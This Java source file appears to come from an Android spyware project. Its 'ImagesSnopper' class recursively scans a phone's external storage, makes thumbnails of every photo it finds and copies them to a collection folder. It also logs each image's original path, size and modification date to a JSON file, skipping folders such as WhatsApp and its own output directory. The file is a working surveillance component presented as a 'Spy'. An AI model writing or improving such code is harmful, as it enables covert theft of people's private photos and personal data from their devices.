package com.gameofcoding.spy.spys;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Environment;
import com.gameofcoding.spy.utils.XLog;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.text.DecimalFormat;
import java.util.Date;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class ImagesSnopper implements Spy {
    private final String TAG = "ImagesSnopper";
    public static final String IMAGES_DIR_NAME = "images";
    public static final String IMAGES_PROPS_FILE_NAME = "images.json";
    public static File mExcepDirs[];
    private File mDestDir;
    private final File ROOT_DIR = Environment.getExternalStorageDirectory();
    private final JSONArray imagesProps = new JSONArray();

    public ImagesSnopper(Context context, File destDir) {
	mDestDir = destDir;
	if(!mDestDir.exists())
	    mDestDir.mkdirs();
	final File androidFolder = new File(ROOT_DIR, "Android");
	File sickboyDir = new File(ROOT_DIR, "SickBoyDir");
	File appProject = new File(ROOT_DIR, "AppProjects");
	File whatsApp = new File(ROOT_DIR, "WhatsApp");
	mExcepDirs = new File[] {
	    destDir,
	    androidFolder,
	    appProject,
	    sickboyDir,
	    whatsApp
	};
    }

    @Override
    public void snoop() {
	scanDir(ROOT_DIR);
	try {
	    FileWriter fw = new FileWriter(new File(mDestDir, IMAGES_PROPS_FILE_NAME));
	    fw.write(imagesProps.toString());
	    fw.flush();
	    fw.close();
	} catch(IOException e) {
	    XLog.e(TAG, "snoop(): Error occurred while saving image props.", e);
	}
    }

    private void scanDir(File directory) {
	if (directory.isDirectory()) {
	    // Return if directory is not to be scanned
	    for(File exceptFile : mExcepDirs) {
		if(directory.toString().equals(exceptFile.toString())) {
		    XLog.e(TAG, "scanDir(File): skipping dir, directory=" + directory);
		    return;
		}
	    }
	    //	    XLog.v(TAG, "Scanning Dir: " + directory.toString());
	    for (File file : directory.listFiles()) {
		if (file.isDirectory())
		    scanDir(file);
		else {
		    if (isImage(file)) {
			// File is an image, compress and store it
			Bitmap compressedImage = compressImage(file.toString());
			if(compressedImage == null)
			    return;

			// Generate new file for storing compressed image
			File destFile = new File(mDestDir, file.getName());
			int suffix = 1;
			while(destFile.exists()) {
			    String newFileName = file.getName();
			    String fileSuffix = "(" + suffix++ + ")";
			    if(newFileName.contains(".")) {
				// e.g test.txt > test(n).txt
				newFileName = newFileName.substring(0, newFileName.lastIndexOf("."))
				    + fileSuffix
				    + newFileName.substring(newFileName.lastIndexOf("."), newFileName.length());;
			    } else {
				// e.g text > text(n)
				newFileName += fileSuffix;
			    }
			    destFile = new File(mDestDir, newFileName);
			}

			// Save details about image in json properties file
			Bitmap bitmapImage = BitmapFactory.decodeFile(file.toString());
			if(bitmapImage == null)
			    return;
			String imagePath = file.toString();
			String actualResolution =
			    bitmapImage.getWidth() + "x" + bitmapImage.getHeight();
			String compressedResolution =
			    compressedImage.getWidth() + "x" + compressedImage.getHeight();
			if(actualResolution.equals(compressedResolution))
			    compressedResolution = "UNCOMPRESSED";
			String readableSize = readableFileSize(file.length());
			String lastModified = new Date(file.lastModified()).toString();
			try {
			    JSONObject image = new JSONObject();
			    image.put("Path: ", imagePath);
			    image.put("New Name: ", destFile.getName());
			    image.put("Resol.: ", actualResolution);
			    image.put("Comp. Resol.: ", compressedResolution);
			    image.put("Size: ", readableSize);
			    image.put("Modified: ", lastModified);
			    imagesProps.put(image);
			} catch(JSONException e) {
			    XLog.e(TAG, "Exception occured while saving image props.", e);
			}
			// Finally store compressed image
			storeImage(compressedImage, destFile);
		    }
		}
	    }
	} else {
	    if(directory.isFile())
		XLog.e(TAG, "scanDir(File): file="+directory+", is a file!");
	    else if(!directory.exists())
		XLog.e(TAG, "scanDir(File): file="+directory+", does not exist!");
	    else
		XLog.e(TAG, "scanDir(File): file="+directory+", could not be loaded!");
	}
    }

    private boolean isImage(File file) {
	if (file == null || !file.exists())
	    return false;
	BitmapFactory.Options options = new BitmapFactory.Options();
	options.inJustDecodeBounds = true;
	BitmapFactory.decodeFile(file.toString(), options);
	return (options.outWidth != -1 && options.outHeight != -1);
    }
    
    private String readableFileSize(long size) {
	if(size <= 0) return "0";
	String[] units = new String[] { "B", "KB", "MB", "GB", "TB" };
	int digitGroups = (int) (Math.log10(size)/Math.log10(1024));
	return new DecimalFormat("#,##0.#").format(size/Math.pow(1024, digitGroups)) + " " + units[digitGroups];
    }

    private Bitmap compressImage(String path) {
	Bitmap bitmapImage = BitmapFactory.decodeFile(path);
	if(bitmapImage == null) {
	    XLog.w(TAG, "compressImage(String): Could not compress image, PATH=" + path);
	    return null;
	}

	// Make image 45px wide and ratio according to that
	if(bitmapImage.getWidth() < 45 && bitmapImage.getHeight() < 70) {
	    XLog.v(TAG, "Image, '" + path + "' is too small to be compressed!");
	    return bitmapImage;
	}
	//	XLog.v(TAG, "Compressing image, path=" + path);
	int newWidth = 45;
	int newHeight = (int) (bitmapImage.getHeight() * (40.0 / bitmapImage.getWidth()));
	Bitmap scaled = Bitmap.createScaledBitmap(bitmapImage, newWidth, newHeight, true);
	return scaled;
    }

    private void storeImage(Bitmap image, File destFile) {
	if(image == null || destFile == null)
	    return;
	//XLog.v(TAG, "Storing image: to=" + destFile);
	try {
	    FileOutputStream fos = new FileOutputStream(destFile);
	    image.compress(Bitmap.CompressFormat.PNG, 100, fos);
	    fos.close();
	} catch (IOException e) {
	    XLog.e(TAG, "Error occurred while storing image", e);
	}
    }

}
